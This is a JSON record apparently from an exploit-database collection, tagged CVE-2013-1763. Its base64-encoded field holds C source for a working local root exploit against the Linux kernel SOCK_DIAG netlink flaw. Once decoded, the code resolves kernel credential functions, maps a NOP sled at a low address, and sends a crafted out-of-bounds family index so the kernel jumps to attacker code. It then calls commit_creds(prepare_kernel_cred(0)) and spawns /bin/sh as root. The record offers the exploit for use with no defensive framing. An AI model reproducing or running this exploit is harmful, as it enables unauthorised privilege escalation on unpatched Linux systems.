{
    "source": "exploit-database", 
    "exploit": "LyogDQoqIHF1aWNrJ24nZGlydHkgcG9jIGZvciBDVkUtMjAxMy0xNzYzIFNPQ0tfRElBRyBidWcgaW4ga2VybmVsIDMuMy0zLjgNCiogYnVnIGZvdW5kIGJ5IFNwZW5kZXINCiogcG9jIGJ5IFN5blENCiogDQoqIGhhcmQtY29kZWQgZm9yIDMuNS4wLTE3LWdlbmVyaWMgIzI4LVVidW50dSBTTVAgVHVlIE9jdCA5IDE5OjMyOjA4IFVUQyAyMDEyIGk2ODYgaTY4NiBpNjg2IEdOVS9MaW51eA0KKiB1c2luZyBubF90YWJsZS0+aGFzaC5yZWhhc2hfdGltZSwgaW5kZXggODENCiogDQoqIEZlZG9yYSAxOCBzdXBwb3J0IGFkZGVkDQoqIA0KKiAyLzIwMTMNCiovDQoNCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8bGludXgvbmV0bGluay5oPg0KI2luY2x1ZGUgPG5ldGluZXQvdGNwLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxsaW51eC9pZi5oPg0KI2luY2x1ZGUgPGxpbnV4L2ZpbHRlci5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8bGludXgvc29ja19kaWFnLmg+DQojaW5jbHVkZSA8bGludXgvaW5ldF9kaWFnLmg+DQojaW5jbHVkZSA8bGludXgvdW5peF9kaWFnLmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCg0KdHlwZWRlZiBpbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9jb21taXRfY3JlZHMpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQp0eXBlZGVmIHVuc2lnbmVkIGxvbmcgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9wcmVwYXJlX2tlcm5lbF9jcmVkKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KX2NvbW1pdF9jcmVkcyBjb21taXRfY3JlZHM7DQpfcHJlcGFyZV9rZXJuZWxfY3JlZCBwcmVwYXJlX2tlcm5lbF9jcmVkOw0KdW5zaWduZWQgbG9uZyBzb2NrX2RpYWdfaGFuZGxlcnMsIG5sX3RhYmxlOw0KDQppbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpDQprZXJuZWxfY29kZSgpDQp7DQoJY29tbWl0X2NyZWRzKHByZXBhcmVfa2VybmVsX2NyZWQoMCkpOw0KCXJldHVybiAtMTsNCn0NCg0KaW50IGp1bXBfcGF5bG9hZF9ub3RfdXNlZCh2b2lkICpza2IsIHZvaWQgKm5saCkNCnsNCglhc20gdm9sYXRpbGUgKA0KCQkibW92ICRrZXJuZWxfY29kZSwgJWVheFxuIg0KCQkiY2FsbCAqJWVheFxuIg0KCSk7DQp9DQoNCnVuc2lnbmVkIGxvbmcNCmdldF9zeW1ib2woY2hhciAqbmFtZSkNCnsNCglGSUxFICpmOw0KCXVuc2lnbmVkIGxvbmcgYWRkcjsNCgljaGFyIGR1bW15LCBzeW1bNTEyXTsNCglpbnQgcmV0ID0gMDsNCiANCglmID0gZm9wZW4oIi9wcm9jL2thbGxzeW1zIiwgInIiKTsNCglpZiAoIWYpIHsNCgkJcmV0dXJuIDA7DQoJfQ0KIA0KCXdoaWxlIChyZXQgIT0gRU9GKSB7DQoJCXJldCA9IGZzY2FuZihmLCAiJXAgJWMgJXNcbiIsICh2b2lkICoqKSAmYWRkciwgJmR1bW15LCBzeW0pOw0KCQlpZiAocmV0ID09IDApIHsNCgkJCWZzY2FuZihmLCAiJXNcbiIsIHN5bSk7DQoJCQljb250aW51ZTsNCgkJfQ0KCQlpZiAoIXN0cmNtcChuYW1lLCBzeW0pKSB7DQoJCQlwcmludGYoIlsrXSByZXNvbHZlZCBzeW1ib2wgJXMgdG8gJXBcbiIsIG5hbWUsICh2b2lkICopIGFkZHIpOw0KCQkJZmNsb3NlKGYpOw0KCQkJcmV0dXJuIGFkZHI7DQoJCX0NCgl9DQoJZmNsb3NlKGYpOw0KIA0KCXJldHVybiAwOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciphcmd2W10pDQp7DQoJaW50IGZkOw0KCXVuc2lnbmVkIGZhbWlseTsNCglzdHJ1Y3Qgew0KCQlzdHJ1Y3Qgbmxtc2doZHIgbmxoOw0KCQlzdHJ1Y3QgdW5peF9kaWFnX3JlcSByOw0KCX0gcmVxOw0KCWNoYXIJYnVmWzgxOTJdOw0KDQoJaWYgKChmZCA9IHNvY2tldChBRl9ORVRMSU5LLCBTT0NLX1JBVywgTkVUTElOS19TT0NLX0RJQUcpKSA8IDApew0KCQlwcmludGYoIkNhbid0IGNyZWF0ZSBzb2NrIGRpYWcgc29ja2V0XG4iKTsNCgkJcmV0dXJuIC0xOw0KCX0NCg0KCW1lbXNldCgmcmVxLCAwLCBzaXplb2YocmVxKSk7DQoJcmVxLm5saC5ubG1zZ19sZW4gPSBzaXplb2YocmVxKTsNCglyZXEubmxoLm5sbXNnX3R5cGUgPSBTT0NLX0RJQUdfQllfRkFNSUxZOw0KCXJlcS5ubGgubmxtc2dfZmxhZ3MgPSBOTE1fRl9ST09UfE5MTV9GX01BVENIfE5MTV9GX1JFUVVFU1Q7DQoJcmVxLm5saC5ubG1zZ19zZXEgPSAxMjM0NTY7DQoNCgkvL3JlcS5yLnNkaWFnX2ZhbWlseSA9IDg5Ow0KCXJlcS5yLnVkaWFnX3N0YXRlcyA9IC0xOw0KCXJlcS5yLnVkaWFnX3Nob3cgPSBVRElBR19TSE9XX05BTUUgfCBVRElBR19TSE9XX1BFRVIgfCBVRElBR19TSE9XX1JRTEVOOw0KDQoJaWYoYXJnYz09MSl7DQoJCXByaW50ZigiUnVuOiAlcyBGZWRvcmF8VWJ1bnR1XG4iLGFyZ3ZbMF0pOw0KCQlyZXR1cm4gMDsNCgl9DQoJZWxzZSBpZihzdHJjbXAoYXJndlsxXSwiRmVkb3JhIik9PTApew0KCSAgY29tbWl0X2NyZWRzID0gKF9jb21taXRfY3JlZHMpIGdldF9zeW1ib2woImNvbW1pdF9jcmVkcyIpOw0KCSAgcHJlcGFyZV9rZXJuZWxfY3JlZCA9IChfcHJlcGFyZV9rZXJuZWxfY3JlZCkgZ2V0X3N5bWJvbCgicHJlcGFyZV9rZXJuZWxfY3JlZCIpOw0KCSAgc29ja19kaWFnX2hhbmRsZXJzID0gZ2V0X3N5bWJvbCgic29ja19kaWFnX2hhbmRsZXJzIik7DQoJICBubF90YWJsZSA9IGdldF9zeW1ib2woIm5sX3RhYmxlIik7DQoJICANCgkgIGlmKCFwcmVwYXJlX2tlcm5lbF9jcmVkIHx8ICFjb21taXRfY3JlZHMgfHwgIXNvY2tfZGlhZ19oYW5kbGVycyB8fCAhbmxfdGFibGUpew0KCQlwcmludGYoInNvbWUgc3ltYm9scyBhcmUgbm90IGF2YWlsYWJsZSFcbiIpOw0KCQlleGl0KDEpOw0KCQl9DQoNCgkgIGZhbWlseSA9IChubF90YWJsZSAtIHNvY2tfZGlhZ19oYW5kbGVycykgLyA0Ow0KCSAgcHJpbnRmKCJmYW1pbHk9JWRcbiIsZmFtaWx5KTsNCgkgIHJlcS5yLnNkaWFnX2ZhbWlseSA9IGZhbWlseTsNCgkgIA0KCSAgaWYoZmFtaWx5PjI1NSl7DQoJCXByaW50ZigibmxfdGFibGUgaXMgdG9vIGZhciFcbiIpOw0KCQlleGl0KDEpOw0KCQl9DQoJfQ0KCWVsc2UgaWYoc3RyY21wKGFyZ3ZbMV0sIlVidW50dSIpPT0wKXsNCgkgIGNvbW1pdF9jcmVkcyA9IChfY29tbWl0X2NyZWRzKSAweGMxMDZiYzYwOw0KCSAgcHJlcGFyZV9rZXJuZWxfY3JlZCA9IChfcHJlcGFyZV9rZXJuZWxfY3JlZCkgMHhjMTA2YmVhMDsNCgkgIHJlcS5yLnNkaWFnX2ZhbWlseSA9IDgxOw0KCX0NCg0KCXVuc2lnbmVkIGxvbmcgbW1hcF9zdGFydCwgbW1hcF9zaXplOw0KCW1tYXBfc3RhcnQgPSAweDEwMDAwOw0KCW1tYXBfc2l6ZSA9IDB4MTIwMDAwOw0KCXByaW50ZigibW1hcHBpbmcgYXQgMHglbHgsIHNpemUgPSAweCVseFxuIiwgbW1hcF9zdGFydCwgbW1hcF9zaXplKTsNCg0KICAgICAgICBpZiAobW1hcCgodm9pZCopbW1hcF9zdGFydCwgbW1hcF9zaXplLCBQUk9UX1JFQUR8UFJPVF9XUklURXxQUk9UX0VYRUMsDQogICAgICAgICAgICAgICAgTUFQX1BSSVZBVEV8TUFQX0ZJWEVEfE1BUF9BTk9OWU1PVVMsIC0xLCAwKSA9PSBNQVBfRkFJTEVEKSB7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJtbWFwIGZhdWx0XG4iKTsNCiAgICAgICAgICAgICAgICBleGl0KDEpOw0KICAgICAgICB9DQoJbWVtc2V0KCh2b2lkKiltbWFwX3N0YXJ0LCAweDkwLCBtbWFwX3NpemUpOw0KDQoJY2hhciBqdW1wW10gPSAiXHg1NVx4ODlceGU1XHhiOFx4MTFceDExXHgxMVx4MTFceGZmXHhkMFx4NWRceGMzIjsgLy8ganVtcF9wYXlsb2FkIGluIGFzbQ0KCXVuc2lnbmVkIGxvbmcgKmFzZCA9ICZqdW1wWzRdOw0KCSphc2QgPSAodW5zaWduZWQgbG9uZylrZXJuZWxfY29kZTsNCg0KCW1lbWNweSggKHZvaWQqKW1tYXBfc3RhcnQrbW1hcF9zaXplLXNpemVvZihqdW1wKSwganVtcCwgc2l6ZW9mKGp1bXApKTsNCg0KCWlmICggc2VuZChmZCwgJnJlcSwgc2l6ZW9mKHJlcSksIDApIDwgMCkgew0KCQlwcmludGYoImJhZCBzZW5kXG4iKTsNCgkJY2xvc2UoZmQpOw0KCQlyZXR1cm4gLTE7DQoJfQ0KDQoJcHJpbnRmKCJ1aWQ9JWQsIGV1aWQ9JWRcbiIsZ2V0dWlkKCksIGdldGV1aWQoKSApOw0KDQoJaWYoIWdldHVpZCgpKQ0KCQlzeXN0ZW0oIi9iaW4vc2giKTsNCg0KfQ==", 
    "filename": "platforms/linux/local/33336.c", 
    "id": "33336", 
    "cves": [
        "CVE-2013-1763"
    ]
}